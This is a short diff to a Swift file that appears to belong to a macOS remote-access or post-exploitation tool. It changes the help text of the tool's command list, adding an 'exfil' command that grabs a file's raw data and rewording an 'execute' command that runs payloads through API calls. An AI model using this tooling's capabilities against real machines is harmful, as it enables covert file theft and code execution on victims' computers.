@@ -236,7 +236,8 @@ public struct ASH {
                     cp; --- Copy a file/folder.
                     screenshot; <Destination> --- Take a snapshot of all screens. This will notify the user.
                     osascript; <Code> --- This will run an Apple script.
-                    execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Sometimes this works better if you're already in the directory of the payload.
+                    exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
+                    execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
                     """
                     return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: commandResult).returnDict as NSDictionary
                 default:
